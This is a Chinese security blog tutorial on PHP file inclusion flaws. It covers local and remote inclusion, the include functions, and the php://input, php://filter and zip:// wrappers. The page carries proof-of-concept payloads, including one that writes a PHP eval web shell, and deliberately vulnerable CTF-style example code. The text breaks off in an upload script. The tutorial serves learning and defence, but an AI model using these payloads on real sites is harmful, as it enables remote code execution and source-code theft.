
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>浅析文件包含 - hybcx's blog</title>

  
    <meta name="description" content="文件包含总结 0x01 文件包含的概念： 把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。 1.1 文件包含的原理： 文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 1.2 文件包含分类： 文件包含分为本地文件包含和远程">
<meta property="og:type" content="article">
<meta property="og:title" content="浅析文件包含">
<meta property="og:url" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="文件包含总结 0x01 文件包含的概念： 把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。 1.1 文件包含的原理： 文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 1.2 文件包含分类： 文件包含分为本地文件包含和远程">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321185813902.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321192756427.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321193810165.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321200640758.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321200926394.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321203740146.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321203837999.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230618164128542.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321204222933.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321204231560.png">
<meta property="article:published_time" content="2023-08-07T01:29:55.116Z">
<meta property="article:modified_time" content="2023-10-22T08:03:55.268Z">
<meta property="article:author" content="hybcx">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321185813902.png">
  
  
  
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/">常见top漏洞</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-08-07T01:29:55.116Z">2023-08-07</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-10-22T08:03:55.268Z">2023-10-22</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>浅析文件包含</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="文件包含总结">文件包含总结</h1>
<h2 id="0x01-文件包含的概念">0x01 文件包含的概念：</h2>
<p><strong>把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。</strong></p>
<h3 id="11-文件包含的原理">1.1 文件包含的原理：</h3>
<p><strong>文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</strong></p>
<h3 id="12-文件包含分类">1.2 文件包含分类：</h3>
<p><strong>文件包含分为本地文件包含和远程文件包含，而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_ url_ include. 如果开启就有可能包含远程文件。远程文件包含需要php.ini中allow_ ur_ include=on, allow_ ur_ fopen = On。在php.ini中，allow_ url_ fopen默认一直是On,而allow_ url_ include从php5.2之后就默认为Off。</strong></p>
<pre><code class="hljs plaintext">本地文件包含：包含服务器上的资源  //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。
远程文件包含：通过HTTP协议包含其他地方的资源</code></pre>
<h3 id="13-文件包含函数">1.3 文件包含函数：</h3>
<p><strong>1,  include():找不到被包含文件时会产生警告(E_ WARNING) ;</strong><br>
<strong>2，include_ once(): 与include () 类似，代码已经被包含则不会再次包含</strong><br>
<strong>3，require():找不到被包含的文件时会产生致命错误(E_ COMPILE ERROR)</strong><br>
<strong>4，require_ once():与require ()类似，代码已经被包含则不会再次包含</strong></p>
<p><strong>思维导图：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321185813902.png" alt="image-20230321185813902"></p>
<h2 id="0x02-php伪协议">0x02 PHP伪协议：</h2>
<p><strong>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</strong></p>
<h3 id="21-phpinput">2.1 php://input</h3>
<p><strong>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
<pre><code class="hljs plaintext">poc：
?file=php://input
[POST DATA] &lt;?php phpinfo();?&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321192756427.png" alt="image-20230321192756427"></p>
<p><strong>注：利用php://input还可以写入php木马,即在post中传入如下代码：</strong></p>
<pre><code class="hljs plaintext">&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code></pre>
<p>例子：</p>
<pre><code class="hljs php"><span class="hljs-comment">//test.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
<span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"a"</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">'r'</span>)) === <span class="hljs-string">'I want flag'</span>){
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"success\n"</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
}

<span class="hljs-comment">//flag.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span> = <span class="hljs-string">'flag{flag_is_here}'</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p><strong>审计test.php知，当参数$a不为空，且读取的文件中包含’I want flag’时，即可显示$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。</strong><br>
<strong>注：遇到file_get_contents()要想到用php://input绕过。</strong></p>
<h3 id="22-phpfilter">2.2 php://filter</h3>
<p><strong>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</strong></p>
<table>
<thead>
<tr>
<th>前缀名称</th>
<th>后加内容</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>resource=</td>
<td>要过滤的数据流</td>
<td>指定要过滤的数据流</td>
</tr>
<tr>
<td>read=</td>
<td>读链的筛选器列表</td>
<td>参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔</td>
</tr>
<tr>
<td>write=</td>
<td>写链的筛选器列表</td>
<td>参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔</td>
</tr>
<tr>
<td>空</td>
<td>两个链的筛选器列表</td>
<td>没有用read=或者write=做前缀的筛选器列表会是轻快应用于读或者写</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">poc1:
?file=php://filter/resource=xxx.php
poc2:
?file=php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
<pre><code class="hljs plaintext">为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里
就会用到php://filter。
php://filter读取文件源代码的时候
需要用到编码器
php://filter/resource=phpinfo.php
php://filter/read=convert.base64-encode/resource=phpinfo.php
php://filter 一般读取文件源代码，然后再进行审计
php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。
可以直接用不带任何过滤器的filter伪协议
payload:file=php://filter/resource=flag.php
也可以用一些没有过滤掉的编码方式和转换方式
payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</code></pre>
<pre><code class="hljs plaintext">怎么写入一句话木马?
$filename = $_GET['file'];
$content = $_GET['content'];
file_put_contents($filename,"&lt;?php exit();".$content);

exit() 退出程序
这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配
置文件等等不允许用户直接访问的文件当中。</code></pre>
<p><strong>exit死亡绕过参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></strong></p>
<p><strong>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</strong></p>
<p><strong>注：更多php://filter用法可参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></strong></p>
<p><strong>eg1:</strong></p>
<pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"php://input"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"zip://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"phar://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data:"</span>)){
	<span class="hljs-keyword">exit</span>(<span class="hljs-string">'hacker!'</span>);
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>){
	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);
}<span class="hljs-keyword">else</span>{
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321193810165.png" alt="image-20230321193810165"></p>
<p><strong>尝试payload：?file=php://filter/resource=flag.php，发现无法显示内容</strong>：</p>
<p><strong>尝试payload：?file=php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</strong></p>
<h3 id="23-zip">2.3 zip://</h3>
<p><strong>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</strong></p>
<pre><code>zip://中只能传入绝对路径。(php版本大于等于php5.3.0)

要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）

只需要是zip的压缩包即可，后缀名可以任意更改。

相同的类型的还有zlib://和bzip2://
file=compress.zlib://flag.php
</code></pre>
<pre><code class="hljs plaintext">poc:
zip://[压缩包绝对路径]#[压缩包内文件]
?file=zip://D:\zip.jpg%23phpinfo.txt</code></pre>
<p><strong>例子：</strong></p>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$file</span>) <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"input"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">"filter"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data"</span>)<span class="hljs-comment">/*||stristr($file,"phar")*/</span>){
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"hick?"</span>;
	<span class="hljs-keyword">exit</span>();
}<span class="hljs-keyword">else</span>{
	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">".php"</span>);
}
<span class="hljs-meta">?&gt;</span>
&lt;!-- flag在当前目录的某个文件中 --&gt;</code></pre>
<pre><code class="hljs php"><span class="hljs-comment">//upload.php</span>
&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
&lt;form action=<span class="hljs-string">"upload.php"</span> method=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span> &gt;
	 &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"fupload"</span> /&gt;
 	&lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"upload!"</span> /&gt;
&lt;/form&gt;
you can upload jpg,png,zip....&lt;br /&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'fupload'</span>] ) ) {
